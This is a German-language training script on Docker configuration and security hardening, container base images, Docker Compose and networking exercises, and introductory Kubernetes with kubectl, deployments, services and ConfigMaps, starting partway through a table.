| `/lib/systemd/system/docker.service` | systemd Unit (Startparameter) |
| `/etc/systemd/system/docker.service.d/*.conf` | systemd Overrides |

#### CLI / Client
| Datei | Zweck |
|-------|-------|
| `~/.docker/config.json` | Registry-Auth, Proxies, Default-Context |

#### Compose
| Datei | Zweck |
|-------|-------|
| `docker-compose.yml` / `compose.yaml` | Stack-Definition |
| `.env` | Variablen für Compose |

#### TLS / Registry-Zertifikate
```bash
/etc/docker/certs.d/
└── registry.example.com:5000/
    └── ca.crt    # CA-Zertifikat (selbstsigniert oder eigene CA)
```

```bash
mkdir -p /etc/docker/certs.d/registry.example.com:5000
cp ca.crt /etc/docker/certs.d/registry.example.com:5000/ca.crt
```

> Kein Docker-Neustart nötig – wird beim nächsten Pull/Push automatisch gelesen.

---

### daemon.json – Konfigurationsoptionen

#### Logging
```json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
```
> ⚠️ **Kaputt:** `"log-driver": "inexistent"` → Docker startet nicht mehr. `dockerd` versucht beim Start den Log-Driver zu initialisieren – ist er unbekannt, bricht der Daemon komplett ab (auch `docker ps` funktioniert nicht mehr).

**Gültige Log-Driver:** `json-file`, `syslog`, `journald`, `gelf`, `fluentd`, `awslogs`, `splunk`, `gcplogs`, `logentries`, `local`, `none`

---

#### Registry Mirror
```json
{
  "registry-mirrors": ["https://mirror.example.com"]
}
```
> ⚠️ **Kaputt:** Falscher Mirror-URL → alle Pulls schlagen still fehl

---

#### Insecure Registry
```json
{
  "insecure-registries": ["192.168.1.100:5000"]
}
```
**Typische Verwendung:** Lokale Entwicklung mit selbst gehosteter Registry ohne TLS – z.B. Harbor oder Plain-Docker-Registry im Heimnetz oder CI-Lab. Nur für private IPs sinnvoll (`192.168.x.x`, `10.x.x.x`, `localhost`).

> ⚠️ **Kaputt:** Produktions-Registry als insecure → gesamte Kommunikation läuft unverschlüsselt über HTTP, Images und Zugangsdaten im Klartext übertragbar

---

#### Storage Driver
```json
{
  "storage-driver": "overlay2"
}
```
> ⚠️ **Kaputt:** Wechsel des Storage-Drivers → alle bestehenden Images/Container sind weg (anderes Verzeichnislayout)

---

#### Data Root
```json
{
  "data-root": "/mnt/docker-data"
}
```
> ⚠️ **Kaputt:** Pfad existiert nicht oder falsches Filesystem (kein overlay2-Support) → Docker startet nicht

---

#### Proxy
```json
{
  "proxies": {
    "http-proxy": "http://proxy:3128",
    "no-proxy": "localhost,127.0.0.1"
  }
}
```
> ⚠️ **Kaputt:** Proxy falsch oder nicht erreichbar → alle Pulls/Pushes hängen

---

#### DNS
```json
{
  "dns": ["8.8.8.8", "1.1.1.1"]
}
```
> ⚠️ **Kaputt:** Falsche DNS-IP → Container-interne Namensauflösung bricht komplett

---

#### Experimental Features
```json
{
  "experimental": true
}
```
> ⚠️ **Kaputt:** In Produktion ungetestete Features aktiv

---

#### IP-Tables (ungetestet)
```json
{
  "iptables": false
}
```
> ⚠️ **Kaputt:** Container-Networking funktioniert nicht mehr, kein Port-Forwarding

---

#### JSON validieren (vor Neustart!)
```bash
dockerd --validate --config-file /etc/docker/daemon.json
## oder
cat /etc/docker/daemon.json | python3 -m json.tool
```
> ⚠️ **Generelle Falle:** Ungültiges JSON (fehlendes Komma, Tippfehler) → `dockerd` startet nicht

---

### overlay2 – Filesystem-Voraussetzungen

#### Unterstützte Filesysteme
| Filesystem | overlay2 | Anmerkung |
|------------|----------|-----------|
| **ext4** | ✅ | Empfohlen, out-of-the-box |
| **xfs** | ✅ | Nur mit `ftype=1` (d_type) |
| **btrfs** | ❌ | Docker blockt overlay2 aktiv – eigener `btrfs`-Driver nötig |
| **tmpfs** | ❌ | Kein d_type-Support |
| **NFS** | ❌ | Kein overlay-Support |
| **FUSE-Varianten** | ❌ | Meist nicht unterstützt |

#### xfs: ftype=1 prüfen
```bash
xfs_info /dev/sda1 | grep ftype
## ftype=1 → OK
## ftype=0 → overlay2 nicht möglich
```

> `ftype=1` muss beim **Formatieren** gesetzt werden – nachträglich nicht änderbar:
```bash
mkfs.xfs -n ftype=1 /dev/sda1
```

#### Mount-Optionen

**ext4** – keine speziellen Mount-Optionen nötig:
```
/dev/sda1 /var/lib/docker ext4 defaults 0 0
```

**xfs** – ebenfalls `defaults` ausreichend, solange `ftype=1` beim Formatieren gesetzt wurde:
```
/dev/sda1 /var/lib/docker xfs defaults 0 0
```

> `defaults` reicht in beiden Fällen – overlay2 ist keine Mount-Option, sondern eine Kernel-Funktion die Docker intern nutzt.

#### btrfs nativer Driver
```json
{
  "storage-driver": "btrfs"
}
```

#### Kernel & Storage Driver prüfen
```bash
## overlay2 im Kernel vorhanden?
grep overlay /proc/filesystems

## Docker-Status
docker info | grep -E "Storage Driver|Backing Filesystem"
```

## Docker build (Sicherheit)

### Multi-stage build #minimal-installation


### Warum ? 

  * Oberfläche klein für Angriffe 

### Hash-Tag 

```
##minimal-installation
```

### Beispiel - Übung 


```
cd
mkdir -p projects/multi-stage-golang
cd projects/multi-stage-golang
```

```
nano Dockerfile
```


```
FROM golang:1.25
WORKDIR /src
COPY <<EOF ./main.go
package main

import "fmt"

func main() {
  fmt.Println("hello, world")
}
EOF
RUN go build -o /bin/hello ./main.go

FROM scratch
COPY --from=0 /bin/hello /bin/hello
CMD ["/bin/hello"]
```

```
docker build -t golang-app:1.0 .
```

```
docker images
docker run --name golang-app golang-app:1.0
docker container ls -a
```

## Docker Security

### Behandlung von Containern aus einer IT-Security-Sicht sowie Security Best Practices


**Image-Security**
- Minimal Base Images (distroless, Chainguard, Wolfi, Alpine vs. Debian-slim Trade-offs)
- Multi-Stage Builds, kein Build-Toolchain im Runtime-Image
- Image Scanning: Trivy, Grype, Snyk – CI-Integration
- SBOM-Generierung (Syft) und Vulnerability-Tracking
- Supply Chain: Image Signing mit cosign/Sigstore, Verifikation per Policy

**Dockerfile Best Practices**
- `USER` non-root, fixe UID/GID
- `COPY --chown`, keine Secrets in Layern (Buildkit Secrets/SSH)
- `.dockerignore`, reproducible builds, Pinning per Digest statt Tag
- HEALTHCHECK, sinnvoller ENTRYPOINT (kein Shell-Form)

**Runtime**
- Capabilities droppen (`--cap-drop=ALL`, gezielt zurückgeben)
- `--read-only` root fs + tmpfs Mounts
- seccomp/AppArmor Profile, no-new-privileges
- User Namespaces, Rootless Docker / Podman als Alternative
- Resource Limits (cgroups) als Security-Maßnahme (DoS-Schutz)

**Container Escapes – konkrete CVE-Beispiele**
- CVE-2019-5736 (runC overwrite)
- CVE-2022-0185 (fsconfig)
- CVE-2024-21626 "Leaky Vessels" (runC fd leak)
- Klassiker: privileged container, Docker socket mount, hostPath

### Base Images im Überblick #minimal-installation


### Alpine
- **Basis:** musl libc + BusyBox, ~5 MB
- **Pro:** sehr klein, eigener Paketmanager (`apk`), große Community
- **Contra:** musl statt glibc → DNS-Resolver-Quirks, fehlende Thread-Local-Storage-Features, Probleme bei Python (Wheels werden oft neu kompiliert), bei Java/Go meist unkritisch
- **Use Case:** Go-Binaries, statisch gelinkte Apps, einfache Services
- **Security:** kleiner Footprint = weniger CVEs, aber eigener CVE-Tracker (separat von Debian/RH-Advisories)

### Debian-slim (`debian:bookworm-slim`)
- **Basis:** glibc, abgespeckte Debian-Variante, ~30 MB
- **Pro:** maximale Kompatibilität, alles läuft, riesiges Paket-Ökosystem (`apt`), Debian Security Team
- **Contra:** größer, mehr installierte Pakete = größere Angriffsfläche, mehr CVE-Noise im Scan
- **Use Case:** Default für „läuft halt", Python/Node-Apps mit nativen Dependencies
- **Verwandt:** `ubuntu:24.04` ähnlich; RedHat-Welt: `ubi-minimal`

### Distroless
- **Basis:** nur App + Runtime-Libs, **keine Shell, kein Paketmanager, kein apt/apk**
- **Varianten:** `static`, `base` (glibc), `cc`, `java`, `nodejs`, `python3`
- **Pro:** drastisch reduzierte Angriffsfläche, kein `sh` für Reverse-Shells nach Exploit, klein (~20 MB)
- **Contra:** Debugging schwer (kein `kubectl exec` Shell), Multi-Stage-Build Pflicht, `:debug`-Tag mit BusyBox nur für Troubleshooting
- **Use Case:** produktive Workloads nach Build-Phase
- **Achtung:** Updates kommen nur via Image-Rebuild – kein in-place Patchen

#### Wolfi (Chainguard, OSS)
- **Basis:** glibc-basierte „undistro", speziell für Container designed, eigener apk-Fork
- **Pro:** **tägliche** Rebuilds, sehr schnelle CVE-Fixes, glibc (keine musl-Probleme wie Alpine), klein, mit Shell+Paketmanager – Distroless-ähnliche Sicherheit aber debugbar
- **Contra:** jüngeres Ökosystem, weniger Pakete als Debian
- **Use Case:** moderne Alternative zu Alpine ohne musl-Schmerzen
- **Hinweis:** Wolfi ist die OSS-Basis hinter Chainguard Images

#### Chainguard Images
- **Basis:** Wolfi-basiert, kommerziell gehärtet
- **Pro:** SLSA Level 3 Builds, signiert (cosign), SBOM included, **oft 0 bekannte CVEs**, FIPS-Varianten, Dev-Variante mit Shell + Prod-Variante distroless-style
- **Contra:** Free-Tier nur `:latest`, gepinnte Versionen kostenpflichtig (Production-relevant!) – das ist der Haken im Training
- **Use Case:** Enterprise mit Compliance-Anforderungen, Lieferkettensicherheit
- **Lizenz wichtig erwähnen:** Free Tier ≠ alle Tags

### Entscheidungsmatrix für die Schulung

| Kriterium | Alpine | Debian-slim | Distroless | Wolfi | Chainguard |
|---|---|---|---|---|---|
| Größe | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Angriffsfläche | klein | groß | sehr klein | klein | sehr klein |
| Debugbarkeit | gut | sehr gut | schlecht | gut | mittel |
| libc | musl | glibc | glibc | glibc | glibc |
| Paketmanager | apk | apt | ❌ | apk | apk |
| CVE-Patch-Speed | mittel | gut | abhängig | sehr schnell | sehr schnell |
| Kosten | frei | frei | frei | frei | teils kommerziell |

### Häufige Stolpersteine zum Erwähnen

- **Alpine + Python:** Wheels werden ignoriert → Build dauert ewig, Image wird trotzdem groß
- **Distroless + Health Checks:** keine Shell → HTTP-basierte Probes nutzen
- **Debugging Distroless:** ephemeral debug containers (`kubectl debug`) wird zum Pflichtthema
- **`:latest` Tags überall:** Reproduzierbarkeit kaputt → immer Digest pinnen (`@sha256:...`)
- **Chainguard Free Tier:** im PoC perfekt, in Production teuer – früh kommunizieren

### Exercise Docker->Capabilities and User


### Run container under specific user: 

```
## user with id 40000 does not need to exist in container 
docker run -it -u 40000 alpine
```

```
## in shell - welcher Benutzer 
id
```

```
## user kurs needs to exist in container (/etc/passwd) 
docker run -it -u kurs alpine 

```

### Default capabilities 

  * Set everytime a new container is started as default 
  * https://github.com/moby/moby/blob/master/profiles/seccomp/default.json


### Run container with less capabilities 

```
cd
mkdir captest
cd captest 
```

```
nano docker-compose.yml 
```

```
services: 
  nginx:
    image: nginx:1.27
    cap_drop:
      - CHOWN
```

```
docker compose up -d
## start and exits 
docker compose ps -a
## 

## what happened -> wants to do chown, but it is not allowed 
docker logs captest_nginx_1 

```

```
docker compose down 
```


### Reference:

  * https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
  * https://www.redhat.com/en/blog/secure-your-containers-one-weird-trick
  * man capabilities

## Docker compose

### Docker compose wordpress


### Exercise 

```
cd
mkdir wp 
cd wp
```

```
nano docker-compose.yml 
```

```yaml
services:
    database:
        image: mysql:5.7
        volumes:
            - database_data:/var/lib/mysql
        restart: always
        environment:
            MYSQL_ROOT_PASSWORD: mypassword
            MYSQL_DATABASE: wordpress
            MYSQL_USER: wordpress
            MYSQL_PASSWORD: wordpress

    wordpress:
        image: wordpress:latest
        depends_on:
            - database
        ports:
            - 8080:80
        restart: always
        environment:
            WORDPRESS_DB_HOST: database:3306
            WORDPRESS_DB_USER: wordpress
            WORDPRESS_DB_PASSWORD: wordpress
        volumes:
            - wordpress_plugins:/var/www/html/wp-content/plugins
            - wordpress_themes:/var/www/html/wp-content/themes
            - wordpress_uploads:/var/www/html/wp-content/uploads
volumes:
    database_data:
    wordpress_plugins:
    wordpress_themes:
    wordpress_uploads:
```


```console
## now start the system
docker compose up -d
## containers running & ports
docker compose ps 


## we can do some test if db is reachable 
docker exec -it wp-wordpress-1 bash 
## within shell do 
apt update 
apt-get install -y telnet
## this should work 
telnet database 3306

## and we even have logs
docker compose logs 

## 
docker compose down 
```

### Exercise 2: Unter anderem Nutzer laufen lassen 

```
cd 
cd wp
```

```
nano docker-compose.yml
```

```yaml
services:
    database:
        image: mysql:5.7
        volumes:
            - database_data:/var/lib/mysql
        restart: always
        environment:
            MYSQL_ROOT_PASSWORD: mypassword
            MYSQL_DATABASE: wordpress
            MYSQL_USER: wordpress
            MYSQL_PASSWORD: wordpress

    wordpress:
        image: wordpress:latest
        #### Hier kommt der user rein ###
        #### userid muss nicht in /etc/passwd im Container existieren 
        user: "10000"
        depends_on:
            - database
        ports:
            - 8080:80
        restart: always
        environment:
            WORDPRESS_DB_HOST: database:3306
            WORDPRESS_DB_USER: wordpress
            WORDPRESS_DB_PASSWORD: wordpress
        volumes:
            - wordpress_plugins:/var/www/html/wp-content/plugins
            - wordpress_themes:/var/www/html/wp-content/themes
            - wordpress_uploads:/var/www/html/wp-content/uploads
volumes:
    database_data:
    wordpress_plugins:
    wordpress_themes:
    wordpress_uploads:
```

```
docker compose down
docker compose up -d
```

```
## Überprüfung
docker exec -it wp-wordpress-1 bash
```

```
## in der bash - zeigt uns die User-id an 
id
```

## Docker Netzwerk

### Docker Netzwerk Exercise


### Prerequisites 

  * Wordpress Stack läuft

### Exercise - Teil 1

```
## Wir wollen das Netzwerk sehen
docker network ls
docker network inspect bridge # oder kuerzer: docker inspect bridge
docker network inspect wp_default
```

```
cd
cd wp
```

```
nano docker-compose.yml
```

```
services:
    database:
        image: mysql:5.7
        volumes:
            - database_data:/var/lib/mysql
        restart: always
        environment:
            MYSQL_ROOT_PASSWORD: mypassword
            MYSQL_DATABASE: wordpress
            MYSQL_USER: wordpress
            MYSQL_PASSWORD: wordpress

    wordpress:
        image: wordpress:latest
        depends_on:
            - database
        ports:
            - 8080:80
        restart: always
        environment:
            WORDPRESS_DB_HOST: database:3306
            WORDPRESS_DB_USER: wordpress
            WORDPRESS_DB_PASSWORD: wordpress
        volumes:
            - wordpress_plugins:/var/www/html/wp-content/plugins
            - wordpress_themes:/var/www/html/wp-content/themes
            - wordpress_uploads:/var/www/html/wp-content/uploads
### Diese 3 Zeilen 
    busybox:
        image: busybox
        command: sleep infinity  

volumes:
    database_data:
    wordpress_plugins:
    wordpress_themes:
    wordpress_uploads:
```

```
docker compose up -d
docker compose exec -it busybox sh
```

```
## in der shell
## +++ -> ip addresse notieren 
ping -c4 wordpress
ping -c4 database
```


### Exercise Teil 2: aus anderem Projekt 

```
cd
mkdir -p appmaster
cd appmaster
```

```
nano docker-compose.yml
```

```
### Diese 3 Zeilen
services:
    busyboxapp:
        image: busybox
        command: sleep infinity
```

```
docker compose up -d
```

```
docker compose exec busyboxapp sh
```

```
ping -c 4 <ip-eines-services-aus-dem-wp-project>
## z.B.
## ping -c 4 172.18.0.3
```

### Optional: container in bestimmten Netz starten (mit run) 

```
docker run -it --network wp_default --name containertester busybox
```

## Image Scanning

### Registry: Beim hochladen scannen #Schutz-vor-Schadsoftware #Schadcode


 * MUST: Wenn images in die eigene private Registry hochgeladen werden, müssen diese gescannt (vulnerabilities)
 * Harbour bietet das beispielsweise als Feedback an.

 * Stichwort: Shift Left ( Security fängt bereits beim Bauen des Images an und im Verlauf an verschiedenen Knotenpunkt
### Kategorie 

```
##Schutz-vor-Schadsoftware #Schadcode
```


### Einschätzung: MUST HAVE 

## Kubernetes - Überblick

### Warum Kubernetes, was macht Kubernetes


  * Virtualisierung von Hardware - xfache bessere Auslastung
  * Google als Ausgangspunkt 
  * Software 2014 als OpenSource zur Verfügung gestellt 
  * Optimale Ausnutzung der Hardware, hunderte bis tausende Dienste können auf einigen Maschinen laufen (Cluster)  
  * Immutable - System
  * Selbstheilend
  
## Wozu dient Kubernetes ?

  * Orchestrierung von Containern
  * am gebräuchlisten aktuell Docker

### Aufbau Allgemein


### Schaubild 

![image](https://github.com/user-attachments/assets/f4de7c54-33a8-46e5-916c-1119575b1aed)

### Komponenten / Grundbegriffe

#### Master (Control Plane)

##### Aufgaben 

  * Der Master koordiniert den Cluster
  * Der Master koordiniert alle Aktivitäten in Ihrem Cluster
    * Planen von Anwendungen
    * Verwalten des gewünschten Status der Anwendungen
    * Skalieren von Anwendungen
    * Rollout neuer Updates.

##### Komponenten des Masters 

###### etcd

  * Verwalten der Konfiguration des Clusters (key/value - pairs) 
  
###### kube-controller-manager  
  
  * Zuständig für die Überwachung der Stati im Cluster mit Hilfe von endlos loops. 
  * kommuniziert mit dem Cluster über die kubernetes-api (bereitgestellt vom kube-api-server)

###### kube-api-server 

  * provides api-frontend for administration (no gui)
  * Exposes an HTTP API (users, parts of the cluster and external components communicate with it)
  * REST API
 
###### kube-scheduler 

  * assigns Pods to Nodes. 
  * scheduler determines which Nodes are valid placements for each Pod in the scheduling queue 
    ( according to constraints and available resources )
  * The scheduler then ranks each valid Node and binds the Pod to a suitable Node. 
  * Reference implementation (other schedulers can be used)
 
#### Nodes  

  * Nodes (Knoten) sind die Arbeiter (Maschinen), die Anwendungen ausführen
  * Ref: https://kubernetes.io/de/docs/concepts/architecture/nodes/

#### Pod/Pods 

  * Pods sind die kleinsten einsetzbaren Einheiten, die in Kubernetes erstellt und verwaltet werden können.
  * Ein Pod (übersetzt Gruppe) ist eine Gruppe von einem oder mehreren Containern
    * gemeinsam genutzter Speicher- und Netzwerkressourcen   
    * Befinden sich immer auf dem gleich virtuellen Server 
    
### Control Plane Node (former: master) - components 

### Node (Minion) - components 

#### General 

  * On the nodes we will rollout the applications

#### kubelet

```
Node Agent that runs on every node (worker) 
Er stellt sicher, dass Container in einem Pod ausgeführt werden.
```

#### Kube-proxy 

  * Läuft auf jedem Node 
  * = Netzwerk-Proxy für die Kubernetes-Netzwerk-Services.
  * Kube-proxy verwaltet die Netzwerkkommunikation innerhalb oder außerhalb Ihres Clusters.
  
### Referenzen 

  * https://www.redhat.com/de/topics/containers/kubernetes-architecture


### Aufbau mit helm,OpenShift,Rancher(RKE),microk8s


![Aufbau](/images/aufbau-komponente-kubernetes.png)

### Welches System ? (minikube, micro8ks etc.)


## Überblick der Systeme 

### General 

```
kubernetes itself has not convenient way of doing specific stuff like 
creating the kubernetes cluster.

So there are other tools/distri around helping you with that.

```

### Kubeadm

#### General 

  * The official CNCF (https://www.cncf.io/) tool for provisioning Kubernetes clusters
    (variety of shapes and forms (e.g. single-node, multi-node, HA, self-hosted))
  * Most manual way to create and manage a cluster 

#### Disadvantages 

  * Plugins sind oftmals etwas schwierig zu aktivieren

### microk8s 

#### General

  * Created by Canonical (Ubuntu)
  * Runs on Linux
  * Runs only as snap
  * In the meantime it is also available for Windows/Mac
  * HA-Cluster 

#### Production-Ready ? 

  * Short answer: YES 

```
Quote canonical (2020):

MicroK8s is a powerful, lightweight, reliable production-ready Kubernetes distribution. It is an enterprise-grade Kubernetes distribution that has a small disk and memory footprint while offering carefully selected add-ons out-the-box, such as Istio, Knative, Grafana, Cilium and more. Whether you are running a production environment or interested in exploring K8s, MicroK8s serves your needs.

Ref: https://ubuntu.com/blog/introduction-to-microk8s-part-1-2

```

#### Advantages

  * Easy to setup HA-Cluster (multi-node control plane)
  * Easy to manage 

### minikube 

#### Disadvantages
  
  * Not usable / intended for production 

#### Advantages 

  * Easy to set up on local systems for testing/development (Laptop, PC) 
  * Multi-Node cluster is possible 
  * Runs und Linux/Windows/Mac
  * Supports plugin (Different name ?)


### k3s



### kind (Kubernetes-In-Docker)

#### General 

  * Runs in docker container 


#### For Production ?

```
Having a footprint, where kubernetes runs within docker 
and the applikations run within docker as docker containers
it is not suitable for production.
```



## Kubernetes - Client

### kubectl installieren und bash completion einrichten


### Client installieren

```
## Danach in PATH reinpacken. Am besten als root 
curl -LO https://dl.k8s.io/release/v1.36.0/bin/linux/amd64/kubectl
cp -a kubectl /usr/local/bin
```

### Bash completion  

```
## Prerequisites bash completion paket ist aktivieren
kubectl completion bash > /etc/bash_completion.d/kubect
su - 
```

### kubectl einrichten mit namespaces


### config einrichten 

```
cd
mkdir -p .kube
cd .kube
cp /tmp/config config
ls -la
## Alternative: nano config befüllen 
## das bekommt ihr aus Eurem Cluster Management Tool 
```

```
kubectl cluster-info
```

### Arbeitsbereich konfigurieren 

```
NS=jochen # hier tragt ihr euren eigenen Namen ein z.B. NS=peter
```

```
kubectl create ns $NS
kubectl get ns
kubectl config set-context --current --namespace $NS
kubectl get pods
```



### Das Tool kubectl (Devs/Ops) - Spickzettel


### Allgemein 

```
## Zeige Information über das Cluster 
kubectl cluster-info 

## Welche api-resources gibt es ?
kubectl api-resources 

## Hilfe zu object und eigenschaften bekommen
kubectl explain pod 
kubectl explain pod.metadata
kubectl explain pod.metadata.name 

```

### Arbeiten mit manifesten 

```
kubectl apply -f nginx-replicaset.yml 
## Wie ist aktuell die hinterlegte config im system
kubectl get -o yaml -f nginx-replicaset.yml 

## Änderung in nginx-replicaset.yml z.B. replicas: 4 
## dry-run - was wird geändert 
kubectl diff -f nginx-replicaset.yml 

## anwenden 
kubectl apply -f nginx-replicaset.yml 

## Alle Objekte aus manifest löschen
kubectl delete -f nginx-replicaset.yml 


```

### Ausgabeformate 

```
## Ausgabe kann in verschiedenen Formaten erfolgen 
kubectl get pods -o wide # weitere informationen 
## im json format
kubectl get pods -o json 

## gilt natürluch auch für andere kommandos
kubectl get deploy -o json 
kubectl get deploy -o yaml 
```



### Zu den Pods 

```
## Start einen pod // BESSER: direkt manifest verwenden
## kubectl run podname image=imagename 
kubectl run nginx image=nginx 

## Pods anzeigen 
kubectl get pods 
kubectl get pod
## Format weitere Information 
kubectl get pod -o wide 
## Zeige labels der Pods
kubectl get pods --show-labels 

## Zeige pods mit einem bestimmten label 
kubectl get pods -l app=nginx 

## Status eines Pods anzeigen 
kubectl describe pod nginx 

## Pod löschen 
kubectl delete pod nginx 

## Kommando in pod ausführen 
kubectl exec -it nginx -- bash 

```

### Arbeiten mit namespaces 

```
## Welche namespaces auf dem System 
kubectl get ns 
kubectl get namespaces 
## Standardmäßig wird immer der default namespace verwendet 
## wenn man kommandos aufruft 
kubectl get deployments 

## Möchte ich z.B. deployment vom kube-system (installation) aufrufen, 
## kann ich den namespace angeben
kubectl get deployments --namespace=kube-system 
kubectl get deployments -n kube-system 

## wir wollen unseren default namespace ändern 
kubectl config set-context --current --namespace <dein-namespace>
```



### Referenz

  * https://kubernetes.io/de/docs/reference/kubectl/cheatsheet/

### kubectl example with run


### Beispiel 1 (das funktioniert)

```
## Zeigt mir die Pods die laufen
kubectl get pods 

## Aufbau des Befehls  
## kubectl run NAME --image=IMAGE_EG_FROM_DOCKER

## Ein Beispiel
kubectl run nginx --image=nginx:1.25.1

kubectl get pods 
## Alle nodes anzeigen
kubectl get nodes -o wide 
## Auf welchem Node läuft der Pods
kubectl get pods -o wide 
```

### Beispiel 2 (das nicht funktioniert !!)

```
kubectl run sonnenschein --image=foo2
## Ergebnis-> pod/sonnenschein created
## ABER: 
## ImageErrPull - Image konnte nicht geladen werden  => bedeutet pod läuft nicht, obwohl nicht 
kubectl get pods 
## Weitere status - info 
kubectl describe pods sonnenschein
```

### Beide Pods wieder löschen

```
kubectl delete pods nginx foo2 
kubectl get pods
```

### Referenz:

  * https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#run

### Bauen einer Applikation mit Resource Objekten


![Bauen einer Webanwendung](images/WebApp.drawio.png)

### kubectl/manifest/pod


### Walkthrough 

```
cd 
mkdir -p manifests
cd manifests
mkdir -p web
cd web
```

```
## vi nginx-static.yml 
nano nginx-static.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-static-web
  labels:
    webserver: nginx
spec:
  containers:
  - name: web
    image: nginx:1.25.1

```

```
kubectl apply -f nginx-static.yml 
kubectl describe pod nginx-static-web 
## Zeige die Konfiguration
kubectl get pod/nginx-static-web -o yaml
kubectl get pod/nginx-static-web -o wide 
```

### kubectl/manifest/replicaset


```
cd
mkdir -p manifests
cd manifests
mkdir 02-rs 
cd 02-rs 
vi rs.yml
```

```
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: nginx-replica-set
spec:
  replicas: 2
  selector:
    matchLabels:
      tier: frontend
  template:
    metadata:
      name: template-nginx-replica-set
      labels:
        tier: frontend
    spec:
      containers:
        - name: nginx
          image: nginx:1.21
          ports:
            - containerPort: 80
             

             
```

```
kubectl apply -f rs.yml 
```

### kubectl/manifest/deployments


```
cd
cd manifests
mkdir 03-deploy
cd 03-deploy 
nano deploy.yml 
```

```

## vi deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 8 
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.21
        ports:
        - containerPort: 80
        
```

```
kubectl apply -f deploy.yml 
```

### Explore 

```
kubectl get all
```

### Optional: Change image - Version 

```
nano nginx-deployment.yml 
```


#### Version 1: (optical nicer)

```
## Ändern des images von nginx:1.21 -> auf 1.22
## danach 
kubectl apply -f . && watch kubectl get pods 
```

#### Version 2: 

```
## Ändern des images von nginxinc/nginx-unprivileged:1.28 -> auf 1.29
## danach 
kubectl apply -f . && kubectl get all && kubectl get pods -w
```

### Services - Aufbau


![Services Aufbau](/images/kubernetes-services.drawio.svg)

### kubectl/manifest/service


### Warum Services ? 

  * Wenn in einem Deployment bei einem Wechsel des images neue Pods erstellt werden, erhalten diese eine neue IP-Adresse
  * Nachteil: Man müsste diese dann in allen Applikation ständig ändern, die auf die Pods zugreifen.
  * Lösung: Wir schalten einen Service davor !

### Hintergrund IP-Wechsel 
 
 <img width="930" height="134" alt="image" src="https://github.com/user-attachments/assets/26c16134-1f2a-4b42-8cca-355099d08604" />

 * Image-Version wurde jetzt in Deployment geändert, Ergebnis:

<img width="939" height="137" alt="image" src="https://github.com/user-attachments/assets/fb5a665b-98a7-445b-8ec7-27f12c2267e1" />


### Example 1: ClusterIP

#### Schritt 1: Deployment 

```
cd
mkdir -p manifests
cd manifests 
mkdir 04-service 
cd 04-service 
```

```
nano 01-deploy.yml
```

```
## 01-deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-nginx
spec:
  selector:
    matchLabels:
      run: my-nginx
  replicas: 3
  template:
    metadata:
      labels:
        run: my-nginx
    spec:
      containers:
      - name: my-nginx
        image: nginx
        ports:
        - containerPort: 80
```

```
kubectl apply -f .
```

#### Schritt 2:

```
nano 02-svc.yml
```

```
## 02-svc.yml 
apiVersion: v1
kind: Service
metadata:
  name: my-nginx
spec:
  ports:
  - port: 80
    protocol: TCP
  selector:
    run: my-nginx
```

```
kubectl apply -f . 
```

```
## wie ist die ClusterIP ?  
kubectl get all
kubectl get svc my-nginx
## Find endpoints / did svc find pods ?
kubectl describe svc my-nginx 
```

#### Schritt 3: Deployment löschen 

```
kubectl delete -f 01-deploy.yml
## Keine endpunkte mehr 
kubectl describe svc my-nginx
```

 ### Schritt 4: Deployment wieder erstellen 

```
kubectl apply -f .
## Endpunkte wieder da
kubectl describe svc my-nginx
```

### Example II : Short version (NodePort)

```
## Wo sind wir ?
## cd; cd manifests/04-service 
```

```
nano 02-svc.yml
## in Zeile type: 
## ClusterIP ersetzt durch NodePort 

kubectl apply -f .
## NodePort ab 30.000 ausfindig machen
kubectl get svc
```

<img width="793" height="44" alt="image" src="https://github.com/user-attachments/assets/16bf90d4-7c3f-4c8f-9846-2ff5d0e63fcf" />

```
kubectl get nodes -o wide
```

<img width="926" height="157" alt="image" src="https://github.com/user-attachments/assets/eb396f36-cff1-4b6d-b136-e110fff1c807" />

```
## im client Externe NodeIP und NodePort verwenden 
curl http://164.92.193.245:32708
```

### Example III: Service mit LoadBalancer (ExternalIP)

```
cd; cd manifests/04-service 
nano 02-svc.yml
## in Zeile type: 
## NodePort ersetzt durch LoadBalancer  

kubectl apply -f .
kubectl get svc svc-nginx

kubectl describe svc my-nginx
## hier heisst das nicht External-IP ->
## sondern
```

<img width="775" height="63" alt="image" src="https://github.com/user-attachments/assets/3f1db219-e5d8-4bbf-a001-17fc5eaae93f" />

```
kubectl get svc my-nginx -w 
## spätestens nach 5 Minuten bekommen wir eine externe ip
## z.B. 41.32.44.45

curl http://41.32.44.45 
```



### Ref.

  * https://kubernetes.io/docs/concepts/services-networking/connect-applications-service/

### Anatomie einer Webanwendung


![image](https://github.com/user-attachments/assets/0a0c519e-fad3-4aac-b945-2e0a7fc2999c)

### ConfigMap Example


### Schritt 1: configmap vorbereiten 
```
cd 
mkdir -p manifests 
cd manifests
mkdir configmaptests 
cd configmaptests
nano 01-configmap.yml
```

```
### 01-configmap.yml
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: example-configmap 
data:
  # als Wertepaare
  database: mongodb
  database_uri: mongodb://localhost:27017
```

```
kubectl apply -f 01-configmap.yml 
kubectl get cm
kubectl get cm -o yaml
```

### Schritt 2: Beispiel als Datei 


```
nano 02-pod.yml
```

```
kind: Pod 
apiVersion: v1 
metadata:
  name: pod-mit-configmap 

spec:
  # Add the ConfigMap as a volume to the Pod
  volumes:
    # `name` here must match the name
    # specified in the volume mount
    - name: example-configmap-volume
      # Populate the volume with config map data
      configMap:
        # `name` here must match the name 
        # specified in the ConfigMap's YAML 
        name: example-configmap

  containers:
    - name: container-configmap
      image: nginx:latest
      # Mount the volume that contains the configuration data 
      # into your container filesystem
      volumeMounts:
        # `name` here must match the name
        # from the volumes section of this pod
        - name: example-configmap-volume
          mountPath: /etc/config


```

```
